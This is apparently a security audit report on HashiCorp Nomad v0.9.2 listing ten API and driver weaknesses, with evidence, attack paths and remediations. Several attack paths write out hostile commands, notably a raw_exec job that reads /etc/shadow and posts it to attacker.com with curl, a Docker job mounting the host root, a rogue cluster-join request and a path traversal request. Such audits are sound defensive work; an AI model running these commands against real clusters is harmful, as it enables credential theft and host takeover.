# Security Audit Report — HashiCorp Nomad v0.9.2

**Audit scope:** API security and logic flaws  
**Codebase path:** `/workspace` (Nomad v0.9.2)  
**Date:** 2026-08-03  

---

## Finding 1 — Unauthenticated Metrics Endpoint Exposes Internal Telemetry

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Location** | `command/agent/metrics_endpoint.go:19-30` |
| **Title** | `/v1/metrics` endpoint has no ACL check |
| **Description** | The `MetricsRequest` handler serves all internal agent telemetry (in-memory sink or Prometheus format) without any authentication or authorization check. There is no call to `parseToken`, `ResolveToken`, or any ACL evaluation. Any network-reachable client can query full metrics. |
| **Impact** | Information disclosure of internal cluster health, RPC latencies, Raft commit rates, job scheduling metrics, GC statistics, and runtime data. An attacker can use this to map cluster topology, identify busy nodes, and time attacks. |
| **Attack path** | `curl http://<nomad-addr>:4646/v1/metrics` — no token required. |
| **Evidence** | `command/agent/metrics_endpoint.go` lines 19-30: the handler only checks the HTTP method, then directly returns `s.agent.InmemSink.DisplayMetrics(resp, req)`. No `parseToken` or `ResolveToken` call exists in this function. Compare with `AgentSelfRequest` (same file's sibling `agent_endpoint.go:46-91`) which does check `AllowAgentRead()`. |
| **Remediation** | Add an ACL check requiring at minimum `agent:read` (or a dedicated `metrics:read`) capability before serving metrics data. |

---

## Finding 2 — Unauthenticated Agent Join Endpoint

| Field | Value |
|---|---|
| **Severity** | High |
| **Location** | `command/agent/agent_endpoint.go:93-116` |
| **Title** | `/v1/agent/join` endpoint has no ACL check |
| **Description** | The `AgentJoinRequest` handler allows adding new server addresses to the Serf cluster join list without any authentication. There is no call to `parseToken`, `ResolveToken`, or any ACL evaluation. |
| **Impact** | An unauthenticated attacker with network access can inject rogue servers into the cluster by calling `PUT /v1/agent/join?address=<attacker-ip>`. This can lead to cluster poisoning, man-in-the-middle of Raft replication, or denial of service. |
| **Attack path** | `curl -X PUT 'http://<nomad-addr>:4646/v1/agent/join?address=<attacker-ip>:4648'` |
| **Evidence** | `command/agent/agent_endpoint.go` lines 93-116: The handler checks HTTP method, verifies the server exists, reads `address` query params, and calls `srv.Join(addrs)`. No token parsing or ACL check. Compare with `AgentForceLeaveRequest` (lines 136-164) which properly checks `AllowAgentWrite()`. |
| **Remediation** | Add `agent:write` ACL check consistent with `AgentForceLeaveRequest`. |

---

## Finding 3 — `/v1/agent/self` Leaks Sensitive Configuration Data

| Field | Value |
|---|---|
| **Severity** | High |
| **Location** | `command/agent/agent_endpoint.go:76-91` |
| **Title** | Incomplete redaction of secrets in agent self-info response |
| **Description** | The `/v1/agent/self` endpoint returns the full agent configuration object. While the Vault token is redacted (line 86-88: `self.Config.Vault.Token = "<redacted>"`), the following sensitive fields are **not** redacted: Consul ACL token (`Config.Consul.Token`), Consul HTTP Auth credentials (`Config.Consul.Auth` which may contain `username:password`), TLS private key paths (`Config.TLSConfig`), Vault address, and full server/client configuration details. |
| **Impact** | An attacker with `agent:read` ACL permissions (or in clusters without ACLs enabled — the default) can extract Consul tokens, HTTP basic-auth credentials, and infrastructure topology details. The Consul token often has broad permissions in the datacenter. |
| **Attack path** | `curl -H "X-Nomad-Token: <any-agent-read-token>" http://<nomad-addr>:4646/v1/agent/self` — parse `config.consul.token` and `config.consul.auth` from the JSON response. |
| **Evidence** | `command/agent/agent_endpoint.go` lines 80-88: Only `self.Config.Vault.Token` is redacted. The `Config` object is a deep copy of `s.agent.config` (a `*Config` struct). `Config.Consul` is of type `*config.ConsulConfig` (defined in `nomad/structs/config/consul.go`) which includes `Token string` (line 63) and `Auth string` (line 66). Neither is cleared before serialization. |
| **Remediation** | Redact `Config.Consul.Token`, `Config.Consul.Auth`, and TLS key file contents before returning the config object. Ideally, create a dedicated sanitized view struct. |

---

## Finding 4 — No Rate Limiting on ACL Bootstrap Endpoint

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Location** | `command/agent/acl_endpoint.go:135-154`, `nomad/acl_endpoint.go:342-414` |
| **Title** | `/v1/acl/bootstrap` has no rate limiting or brute-force protection |
| **Description** | The ACL bootstrap endpoint has a one-time-use semantic (can only bootstrap once unless a reset file is placed on disk). However, there is no rate limiting on the HTTP handler or the RPC method. There is also no rate limiting on any other ACL token endpoint (`/v1/acl/tokens`, `/v1/acl/token/self`, `/v1/acl/token/<accessor>`). An attacker who gains access to a freshly deployed or reset cluster can repeatedly attempt bootstrap calls without delay. More critically, token CRUD operations lack rate limiting, enabling brute-force of accessor IDs. |
| **Impact** | In a race condition during cluster initialization, an attacker could bootstrap the ACL system before the legitimate operator, gaining a management token with full cluster control. The absence of rate limiting on token operations also enables token accessor enumeration. |
| **Attack path** | 1. Monitor for new Nomad clusters on the network. 2. Race to call `PUT /v1/acl/bootstrap` before the operator. 3. Obtain the management token and take full control. |
| **Evidence** | `nomad/acl_endpoint.go` lines 342-414: The `Bootstrap` function checks `CanBootstrapACLToken()` and optionally the file reset index, but has no rate limiting, backoff, or IP-based throttling. The HTTP handler in `command/agent/acl_endpoint.go:135-154` has no middleware rate limiting. No rate-limiting library (e.g., `golang.org/x/time/rate`) is used in any HTTP handler or ACL RPC path in the Nomad server code. |
| **Remediation** | Add rate limiting to the bootstrap endpoint and all token mutation endpoints. Consider adding a startup delay or nonce-based challenge for bootstrap. |

---

## Finding 5 — Raw Exec Driver Allows Arbitrary Host Command Execution

| Field | Value |
|---|---|
| **Severity** | Critical |
| **Location** | `drivers/rawexec/driver.go:94-98, 305-381` |
| **Title** | `raw_exec` driver executes arbitrary commands as the Nomad agent user with no isolation |
| **Description** | The `raw_exec` driver explicitly provides zero filesystem or process isolation (`FSIsolation: drivers.FSIsolationNone`, line 97). When enabled, it fork/execs arbitrary commands specified in the job `config.command` field directly on the host. The only gate is a boolean `enabled` config flag (default `false`, line 76). Cgroups are optionally applied (line 334) but only provide resource accounting, not security isolation. There is no chroot, no namespace isolation, no seccomp, and no capability dropping. |
| **Impact** | Any user with `namespace:submit-job` ACL permission can execute arbitrary commands as the Nomad client agent's user (often root). This enables full host compromise: reading `/etc/shadow`, installing backdoors, pivoting to other hosts, and accessing all other allocations on the node. |
| **Attack path** | 1. Submit a job with `driver = "raw_exec"` and `config { command = "/bin/bash" args = ["-c", "cat /etc/shadow > /tmp/exfil && curl http://attacker.com/steal -d @/tmp/exfil"] }`. 2. The command runs as the Nomad agent user on the target host. |
| **Evidence** | `drivers/rawexec/driver.go` line 97: `FSIsolation: drivers.FSIsolationNone`. Lines 336-345: `ExecCommand` is constructed with `Cmd: driverConfig.Command, Args: driverConfig.Args` and `TaskDir: cfg.TaskDir().Dir` but no chroot or mount namespace. Line 334: `useCgroups` is only for resource control, not security. The driver documentation comment at line 101-103 confirms: "Driver is a privileged version of the exec driver. It provides no resource isolation and just fork/execs." |
| **Remediation** | Disable `raw_exec` by default (already done). Restrict which ACL policies can submit `raw_exec` jobs via Sentinel policies (enterprise) or a driver allowlist. Add operator warnings when `raw_exec` is enabled. Consider requiring a separate, stronger ACL permission for `raw_exec` job submission. |

---

## Finding 6 — Docker Driver Allows Host Volume Mounts and Privileged Mode

| Field | Value |
|---|---|
| **Severity** | High |
| **Location** | `drivers/docker/config.go:203-209, 210, 348-349`, `drivers/docker/driver.go:609-635, 748-752, 863` |
| **Title** | Docker driver defaults allow host volume mounts; privileged and host network mode are configurable per-job |
| **Description** | The Docker driver configuration defaults `volumes.enabled` to `true` (config.go line 209: `hclspec.NewLiteral("{ enabled = true }")`). When enabled, job submitters can mount arbitrary host paths into containers using the `volumes` or `mounts` task config fields. The `privileged` flag (line 349) is also available in the task config; while blocked by `allow_privileged` (driver.go lines 749-751), the default for `allow_privileged` is not explicitly set to `false` in the config spec (it's a bare `bool` defaulting to Go zero value). `network_mode` (line 346, driver.go line 863) can be set to `"host"`, giving containers full host network access with no validation. |
| **Impact** | A job submitter can mount sensitive host paths (e.g., `/etc`, `/var/run/docker.sock`, `/root/.ssh`) into a container, achieving host escape. With `network_mode: "host"`, containers can access all host network interfaces and services. If `allow_privileged` is enabled, full host compromise is trivially achieved via `--privileged` containers. |
| **Attack path** | 1. Submit a Docker job with `config { image = "alpine" volumes = ["/:/host"] command = "/bin/sh" args = ["-c", "cat /host/etc/shadow"] }`. 2. If volumes are enabled (default), the host root filesystem is mounted into the container. 3. Alternatively, use `network_mode = "host"` to access host-bound services (Docker socket, metadata services, etc.). |
| **Evidence** | `drivers/docker/config.go` line 209: volumes default to enabled. `drivers/docker/driver.go` lines 609-635: volume mount validation only checks `d.config.Volumes.Enabled` and `isParentPath(task.AllocDir, src)`. Line 863: `hostConfig.NetworkMode = driverConfig.NetworkMode` — no validation against `"host"` mode. Lines 748-752: privileged mode check exists but relies on operator setting `allow_privileged`. |
| **Remediation** | Default `volumes.enabled` to `false`. Add explicit validation/blocking of `network_mode = "host"` unless explicitly allowed by operator config. Add an operator config `allow_host_network` (default `false`). Document that `allow_privileged` should never be enabled in multi-tenant environments. |

---

## Finding 7 — Job Definitions Expose Vault Tokens in Transit

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Location** | `nomad/structs/structs.go:3256-3259`, `command/agent/job_endpoint.go:591-610` |
| **Title** | VaultToken field on Job struct is only cleared after submission, but visible during transit |
| **Description** | The `Job` struct contains a `VaultToken string` field (structs.go line 3259) documented as "only used to transfer the token and is not stored after Job submission." Similarly, `JobRevertRequest` has a `VaultToken` field (line 567). While the comment says it's not persisted, the token travels through RPC and is present in the request struct. The `ApiJobToStructJob` conversion (job_endpoint.go line 607) copies `VaultToken: *job.VaultToken` directly. If job definitions are logged, audited, or returned in non-sanitized form at any point, the Vault token leaks. |
| **Impact** | Vault tokens submitted with jobs may be exposed through debug logging, audit trails, or RPC interception. The token provides access to all Vault policies specified in the job. |
| **Attack path** | 1. Intercept RPC traffic between Nomad client and server (if TLS is not enabled — TLS is optional). 2. Extract `VaultToken` from the `JobRegisterRequest` payload. 3. Use the token to access Vault secrets. |
| **Evidence** | `nomad/structs/structs.go` lines 3256-3259: `VaultToken string` field on Job struct. The field is documented as ephemeral but is a regular struct field that would be serialized/logged by default. No `json:"-"` or similar exclusion tag is present. |
| **Remediation** | Add `json:"-"` tag to `VaultToken` to prevent serialization. Ensure the token is zeroed after use in the registration handler. Enforce TLS for all RPC communication. |

---

## Finding 8 — No Path Traversal Prevention in FS Endpoint HTTP Layer

| Field | Value |
|---|---|
| **Severity** | Low |
| **Location** | `command/agent/fs_endpoint.go:28-46`, `client/allocdir/alloc_dir.go:356-361` |
| **Title** | Path traversal defense is only at the AllocDir layer, not at the HTTP/API layer |
| **Description** | The HTTP filesystem endpoint (`command/agent/fs_endpoint.go`) passes user-supplied `path` query parameters directly to the RPC layer without any sanitization or validation. The defense against path traversal relies entirely on `structs.PathEscapesAllocDir()` called inside `AllocDir.List()`, `AllocDir.Stat()`, and `AllocDir.ReadAt()` (allocdir/alloc_dir.go lines 357, 383, 406). While this defense exists, it is a single layer of protection on the client side only. The server-side forwarding path (`nomad/client_fs_endpoint.go`) passes the path through without validation. |
| **Impact** | If a bug exists in `PathEscapesAllocDir` or the path is manipulated between the HTTP layer and the allocdir layer, an attacker could read files outside the allocation directory. The secret directory protection in `ReadAt` (line 417) is properly implemented but adds defense-in-depth only for read operations, not for `List` or `Stat`. |
| **Attack path** | `curl 'http://<nomad-addr>:4646/v1/client/fs/ls/<alloc-id>?path=../../../etc'` — currently blocked by `PathEscapesAllocDir` but relies on single-layer defense. |
| **Evidence** | `command/agent/fs_endpoint.go` lines 51-56: `path` is taken directly from `req.URL.Query().Get("path")` with no validation. `client/allocdir/alloc_dir.go` line 357: `PathEscapesAllocDir` is the sole defense. No HTTP-layer path canonicalization or validation. |
| **Remediation** | Add path validation at the HTTP layer (reject paths containing `..`, null bytes, or absolute paths). Add defense-in-depth path checks at the server-side RPC handler before forwarding to client. |

---

## Finding 9 — Cross-Allocation Access Not Prevented at API Level

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Location** | `command/agent/fs_endpoint.go:48-87`, `nomad/client_fs_endpoint.go:111-114` |
| **Title** | FS API allows any authenticated user to access any allocation's filesystem |
| **Description** | The filesystem API endpoints accept an arbitrary `allocID` in the URL path and only check `ReadFS` namespace capability. There is no verification that the requesting user/token is associated with the specific allocation or job. Any token with `namespace:read-fs` can read files from any allocation in that namespace. |
| **Impact** | In a multi-tenant namespace, a user with `read-fs` permission for one job can read files (including logs, configuration, and application data) from any other job's allocations in the same namespace. This breaks job-level isolation. |
| **Attack path** | 1. User A has `read-fs` permission in namespace `default`. 2. User A lists allocations: `GET /v1/allocations`. 3. User A reads User B's allocation files: `GET /v1/client/fs/cat/<userB-alloc-id>?path=secrets/data`. |
| **Evidence** | `nomad/client_fs_endpoint.go` lines 111-114: ACL check is `aclObj.AllowNsOp(args.Namespace, acl.NamespaceCapabilityReadFS)` — namespace-level only. `command/agent/fs_endpoint.go` line 51: `allocID` is taken directly from the URL with no ownership verification. |
| **Remediation** | Consider adding job-level or allocation-level ACL scoping for filesystem access. At minimum, document that `read-fs` grants access to all allocations in the namespace. |

---

## Finding 10 — Dispatch Payload Written to Disk Without Sanitization

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Location** | `nomad/job_endpoint.go:1332-1414`, `nomad/structs/structs.go` (DispatchPayloadConfig) |
| **Title** | Dispatch payload is compressed and stored as job payload without content validation |
| **Description** | The `Dispatch` RPC handler (job_endpoint.go:1332) accepts an arbitrary binary `Payload` from the dispatch request, validates only its size (line 1461: `DispatchPayloadSizeLimit`), compresses it with Snappy (line 1393), and stores it as part of the dispatched job. The payload is later decompressed and written to a file specified by `DispatchPayload.File` in the task configuration. The dispatch payload file path comes from the parameterized job definition, but the payload content is entirely user-controlled. There is no content-type validation, no sanitization, and no restriction on binary content. |
| **Impact** | If the dispatched task reads and processes the payload (e.g., as a script, configuration file, or data input), an attacker with `dispatch-job` permission can inject malicious content. While the payload file path is defined by the job (not the dispatcher), the content is attacker-controlled. |
| **Attack path** | 1. Find a parameterized job that processes its payload as executable content (e.g., a shell script processor). 2. Dispatch with a malicious payload: `PUT /v1/job/<job-id>/dispatch` with `{"Payload": "<base64-encoded-malicious-script>"}`. 3. The payload is written to disk and executed by the task. |
| **Evidence** | `nomad/job_endpoint.go` lines 1451-1462: `validateDispatchRequest` only checks payload presence, size, and metadata keys. No content validation. Line 1393: `dispatchJob.Payload = snappy.Encode(nil, args.Payload)` — raw compression with no sanitization. |
| **Remediation** | Document that dispatch payloads should be treated as untrusted input. Consider adding optional content-type validation or payload signing. Parameterized job authors should validate dispatch payloads before use. |

---

## Summary Table

| # | Severity | Finding |
|---|---|---|
| 1 | Medium | Unauthenticated `/v1/metrics` endpoint |
| 2 | High | Unauthenticated `/v1/agent/join` endpoint |
| 3 | High | `/v1/agent/self` leaks Consul token and HTTP auth credentials |
| 4 | Medium | No rate limiting on ACL bootstrap |
| 5 | Critical | `raw_exec` driver allows arbitrary host command execution |
| 6 | High | Docker driver defaults allow host volume mounts and host network |
| 7 | Medium | Vault tokens exposed in job struct during transit |
| 8 | Low | Path traversal defense is single-layer |
| 9 | Medium | Cross-allocation filesystem access within namespace |
| 10 | Medium | Dispatch payloads not validated for content |

---

*End of report.*
